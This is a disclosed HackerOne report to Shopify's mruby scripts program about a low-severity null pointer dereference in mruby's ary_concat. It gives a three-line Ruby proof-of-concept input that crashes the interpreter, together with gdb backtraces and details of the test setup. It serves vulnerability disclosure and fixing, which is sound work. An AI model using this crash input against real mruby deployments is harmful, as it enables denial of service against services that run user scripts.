# Null pointer dereference in ary_concat 

## Report Details
- **Report ID**: 214681
- **URL**: https://hackerone.com/reports/214681
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-19T15:38:46.502Z
- **Disclosed**: 2017-04-15T14:44:57.417Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a crash:

    def f
    end
    [][*@a] = f &:s
    
Debug info
==========
mruby crashes in array.c:260 due to a null pointer dereference.

    256│ ary_concat(mrb_state *mrb, struct RArray *a, struct RArray *a2)
    257│ {
    258│   mrb_int len;
    259│
    260├>  if (a2->len > ARY_MAX_SIZE - a->len) {
    261│     mrb_raise(mrb, E_ARGUMENT_ERROR, "array size too big");

    (gdb) p a 
    $2 = (struct RArray *) 0x0
    
    (gdb) bt
    #0  0x0000000000402eff in ary_concat (mrb=0x6af010, a=0x0, a2=0x6b1290) at /home/user/repos/mruby/src/array.c:260
    #1  0x0000000000403021 in mrb_ary_concat (mrb=0x6af010, self=..., other=...) at /home/user/repos/mruby/src/array.c:279
    #2  0x000000000042228a in mrb_vm_exec (mrb=0x6af010, proc=0x6b13b0, pc=0x718c14) at /home/user/repos/mruby/src/vm.c:2288
    #3  0x000000000041b6d6 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:823
    #4  0x0000000000423ad8 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:2614
    #5  0x0000000000444ac0 in mrb_load_exec (mrb=0x6af010, p=0x70ce90, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5760
    #6  0x0000000000444b56 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cad0, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5769
    #7  0x0000000000402415 in main (argc=2, argv=0x7fffffffdbc8) at /home/user/repos/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227

    
mruby-engine crashes in vm.c:1210 (`CASE(OP_SEND)`).

    1210├>      m = mrb_method_search_vm(mrb, &c, mid)
        
    (gdb) bt
    #0  mrb_vm_exec (mrb=mrb@entry=0x7ffff2ba74e0, proc=proc@entry=0x7ffff2baec90, pc=0x7ffff2c05f44) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1210
    #1  0x00007ffff4043392 in mrb_vm_run (mrb=0x7ffff2ba74e0, proc=0x7ffff2baec90, self=..., stack_keep=stack_keep@entry=0) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby
    /src/vm.c:820
    #2  0x00007ffff4018b4e in mruby_engine_monitored_eval (data=0x7ffff2ba73e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
    #3  0x00007ffff7bc4184 in start_thread (arg=0x7ffff2ba6700) at pthread_create.c:312
    #4  0x00007ffff6f3a37d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

Test platform
=============
* Arch Linux, updated as of today (2017-03-19)
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)

mruby SHA: cea6a16cf41b5268a0ad38d1c6ab3140e375f0f3
mruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f

Thank you,
Dinko Galetic
Denis Kasak

## Attachments
- poc
